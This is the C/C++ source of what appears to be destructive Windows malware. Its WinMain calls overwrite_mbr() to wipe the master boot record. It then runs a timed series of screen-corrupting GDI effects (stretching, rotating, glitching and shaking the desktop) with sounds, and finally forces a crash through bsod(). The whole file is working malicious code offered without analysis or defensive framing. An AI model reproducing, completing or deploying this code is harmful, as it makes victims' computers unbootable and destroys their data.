﻿#include "main.h"

DWORD WINAPI screenp(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(0), i = 0;
    while (1) {
        i += 1;
        SelectObject(desk, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
        BitBlt(desk, -i, 0, sw, sh, desk, 0, 0, 0x89345c);BitBlt(desk, i, 0, sw, sh, desk, 0, 0, 0x89345c);
        BitBlt(desk, 0, -i, sw, sh, desk, 0, 0, 0x89345c);BitBlt(desk, 0, i, sw, sh, desk, 0, 0, 0x89345c);
        Sleep(39.9);
        if (stopscreenp == 1) return GetThreadId(screenp);
    }
}

DWORD WINAPI glitchdick(LPVOID lpParam)
{
    int ticks = GetTickCount(), w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 21) {
        if (!i)InvalidateRect(0, 0, 0);
        HDC hdc = GetDC(0), hdcMem = CreateCompatibleDC(hdc);HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcMem, hbm);BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;BYTE bt = 0;
        if ((GetTickCount() - ticks) > 60000) bt = rand() & 0xff;
        for (int i = 1; w * h > i; i++) {
            if (i % h == 0 && rand() % 100 == 0) v = 1 + rand() % 50;
            ((BYTE*)(data + i))[v % 3] += ((BYTE*)(data + v))[i] ^ bt;
        }
        SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc, 0, 0, w, h, hdcMem, rand()%3-1, rand()%3-1, NOTSRCERASE);
        DeleteObject(hbm); DeleteObject(hdcMem);
        DeleteObject(hdc);
        Sleep(1350);
    }
}
DWORD WINAPI plgscr(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(0), counter = 0, v = 0;
    POINT pt[3]; RECT rekt;
    while (1) {
        v = rand() % 2;
        if (v == 0) counter = 39; else counter = -39;

        GetWindowRect(GetDesktopWindow(), &rekt);

        HDC deskMem = CreateCompatibleDC(desk);
        HBITMAP screenshot = CreateCompatibleBitmap(desk, sw, sh);
        SelectObject(deskMem, screenshot);

        pt[0].x = rekt.left + counter;pt[0].y = rekt.top - counter;
        pt[1].x = rekt.right + counter;pt[1].y = rekt.top + counter;
        pt[2].x = rekt.left - counter;pt[2].y = rekt.bottom - counter;
        PlgBlt(deskMem, pt, desk, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);

        SelectObject(desk, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));

        BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, 0x98123c);
        DeleteObject(screenshot);
        DeleteDC(deskMem);
        Sleep(21.6);
        if (stopplgscr == 1) return GetThreadId(plgscr);
        if ((rand() % 100 + 1) % 29 == 0) for(int i = 0; i < 40; i++) InvalidateRect(0, 0, 0);
        Sleep(19);
    }
}
DWORD WINAPI screenrotate(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    RECT rekt;POINT wPt[3];
    while (1) {
        GetWindowRect(GetDesktopWindow(), &rekt);
        wPt[0].x = rand()%sw; wPt[0].y = rand() % sh;
        wPt[1].x = rand() % sw; wPt[1].y = rand() % sh;
        wPt[2].x = rand() % sw; wPt[2].y = rand() % sh;
        PlgBlt(desk, wPt, desk, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
    }
}
DWORD WINAPI spiral(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), counter = M_PI*M_PI*M_PI, xSize = sh, ySize = sw/45;
    RECT rekt; POINT pt[3];
    while (1) {
        if (stopspiral == 1) return GetThreadId(spiral);
        for (int i = 0; i < sh/3; i++) {
            GetWindowRect(GetDesktopWindow(), &rekt);
            pt[0].x = rekt.left + counter;
            pt[0].y = rekt.top - sin(i / ((float)xSize) * M_PI) * (ySize);
            pt[1].x = rekt.right + counter;
            pt[1].y = rekt.top + counter;
            pt[2].x = rekt.left - counter;
            pt[2].y = rekt.bottom - counter;
            PlgBlt(desk, pt, desk, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
            Sleep(5.9);
            if (stopspiral == 1) return GetThreadId(spiral);
        }
    }
}
DWORD WINAPI textdraw(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    POINT pt;
    while (1) {
        GetCursorPos(&pt);
        LPCWSTR text = L"";
        SetBkColor(desk, RGB(rand()%256, rand()%256, rand()%256));
        SetTextColor(desk, RGB(100+rand()%155, rand()%255-rand()%10, 10+rand()%245));
        TextOut(desk, -rand()%sw+100, rand() % sh, text, sizeof(text)*rand()%sh+rand()%((pt.x+pt.y)+5));
        if (stoptextdraw == 1) return GetThreadId(textdraw);
    }
}
DWORD WINAPI megashake(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1) {
        int power = 29+rand()%74, angle = 1 + rand()%361;
        int x = power * cos(angle * M_PI / 180.0), y = power * sin(angle * M_PI / 180.0);
        for (int i = 0; i < 50; i+=2)
        {
            BitBlt(desk, 0, 0, sw, sh, desk, x, y, SRCCOPY);
            Sleep(4);
        }
    }
}
DWORD WINAPI screenstretch(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), x, y, v = 0, i = 0, dw = SRCCOPY;
    while (1) {
        i+=2.5;
        if (i > 2800 / 2.5) { SelectObject(desk, CreateSolidBrush(RGB(rand()%256, rand()%256, rand()%256))); dw = 0x89345c; };
        v = rand() % 2;
        if (v == 1) x = rand() % sw / 15, y = rand() % sw / 15; else x = -(rand() % sw / 26), y = -(rand() % sw / 26);
        StretchBlt(desk, 0, 0, sw + x, sh + y, desk, 0, 0, sw, sh, dw);
        Sleep(rand() % 39);
        if ((rand() % 100 + 1) % 39 == 0) InvalidateRect(0, 0, 0);
        if (stopscreenstretch == 1) return GetThreadId(screenstretch);
    }
}
DWORD WINAPI puzzle(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), size = 300;
    while (1) {
        if (stoppuzzle == 1) return GetThreadId(puzzle);
        int p = 2 + rand() % 99;
        for (int x = 1; x < sw; x+=size*p) {
            for (int y = 1; y < sh; y+=size*p) {
                StretchBlt(desk, x, y, size, size, desk, x, y, size, size, NOTSRCCOPY);
            }
        }
        size -= 52;
        if (size < 3) { size = 300; }
        if (stoppuzzle == 1) return GetThreadId(puzzle);
    }
}
DWORD WINAPI psyhoz(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), power = 57.4;
    while (1) {if (stoppsyhoz == 1) return GetThreadId(psyhoz);
        for (int angle = 0; angle < 361; angle+=M_PI/2) {
            int x = power * cos(angle * M_PI / 180.0), y = power * sin(angle * M_PI / 180.0);
            StretchBlt(desk, x / 2, y / 2, sw - x, sh - y, desk, 0, 0, sw, sh, SRCCOPY);
            if (stoppsyhoz == 1) return GetThreadId(psyhoz);
        }
    }
} 
DWORD WINAPI blurmash(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    while (1) {
        int x = rand() % sw + 1, y = rand() % sh + 1, sx = rand() % 11 - 5, sy = rand() % 11 - 5;
        BitBlt(desk, x, y, 361, 361, desk, x + sx, y + sy, SRCAND); BitBlt(desk, x, y, 361, 361, desk, x + sx, y + sy, SRCPAINT);
        if (stopblurmash == 1) return GetThreadId(blurmash);
    }
}
DWORD WINAPI trash(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), px = -110, py = -50, dw = SRCCOPY;
    while (1) {
        StretchBlt(desk, 0, 0, sw + px, sh, desk, 0, 0, sw, sh, dw);
        StretchBlt(desk, 0, 0, sw + px, sh, desk, +px, 0, sw, sh, dw);
        StretchBlt(desk, 0, 0, sw, sh + py, desk, 0, 0, sw, sh, dw);
        StretchBlt(desk, 0, 0, sw, sh + py, desk, 0, +py, sw, sh, dw);
        
        Sleep(100);
        if (stoptrash == 1) return GetThreadId(trash);
    }
}
DWORD WINAPI waves(LPVOID lpParam) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh/10, ySize = 9;
    while (1) {
        for (int i = 0; i < sh*2; i++) {
            int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
            BitBlt(desk, i, 0, 1, sh, desk, i, wave, SRCCOPY);
        }
        for (int i = 0; i < sw*2; i++) {
            int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
            BitBlt(desk, 0, i, sw, 1, desk, wave, i, SRCCOPY);
        }
        if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
        if (stopwaves == 1) return GetThreadId(waves);
    }
}
int __stdcall WinMain(HINSTANCE(a), HINSTANCE(b), LPSTR(c), int(d))
{
    srand(static_cast<unsigned int>(time(0)));

    overwrite_mbr();

    sound1();
    CreateThread(0, 0, screenstretch, 0, 0, 0);
    Sleep(28000);
    stopscreenstretch = 1; TerminateThread(screenstretch, GetThreadId(screenstretch));
    sound2();
    CreateThread(0, 0, plgscr, 0, 0, 0);
    Sleep(28000);
    stopplgscr = 1; TerminateThread(plgscr, GetThreadId(plgscr));
    sound3();
    CreateThread(0, 0, screenp, 0, 0, 0);
    Sleep(30000);
    stopscreenp = 1; TerminateThread(screenp, GetThreadId(screenp));
    sound4();
    CreateThread(0, 0, spiral, 0, 0, 0);
    Sleep(40000);
    for (int i = 0; i < 6; i++) InvalidateRect(0, 0, 0);
    stopspiral = 1; TerminateThread(spiral, GetThreadId(spiral));
    sound5();
    CreateThread(0, 0, puzzle, 0, 0, 0);
    Sleep(30000);
    for (int i = 0; i < 6; i++) InvalidateRect(0, 0, 0);
    stoppuzzle = 1; TerminateThread(puzzle, GetThreadId(puzzle));
    sound6();
    CreateThread(0, 0, blurmash, 0, 0, 0);
    Sleep(15000);
    for (int i = 0; i < 6; i++) InvalidateRect(0, 0, 0);
    stopblurmash = 1; TerminateThread(blurmash, GetThreadId(blurmash));
    sound6();
    CreateThread(0, 0, psyhoz, 0, 0, 0);
    Sleep(15000);
    for (int i = 0; i < 6; i++) InvalidateRect(0, 0, 0);
    stoppsyhoz = 1; TerminateThread(psyhoz, GetThreadId(psyhoz));
    sound7();
    CreateThread(0, 0, trash, 0, 0, 0);
    Sleep(15000);
    for (int i = 0; i < 100; i++) InvalidateRect(0, 0, 0);
    stoptrash = 1; TerminateThread(trash, GetThreadId(trash));
    CreateThread(0, 0, waves, 0, 0, 0);
    Sleep(15000);
    sound8();
    CreateThread(0, 0, textdraw, 0, 0, 0);
    Sleep(13665);
    for (int i = 0; i < 6; i++) InvalidateRect(0, 0, 0);
    stoptextdraw = 1; TerminateThread(textdraw, GetThreadId(textdraw));
    CreateThread(0, 0, megashake, 0, 0, 0);
    Sleep(8000);
    for (int i = 0; i < 6; i++) InvalidateRect(0, 0, 0);
    CreateThread(0, 0, glitchdick, 0, 0, 0);
    Sleep(19335);

    bsod();

    ExitProcess(0);
    while (1);
}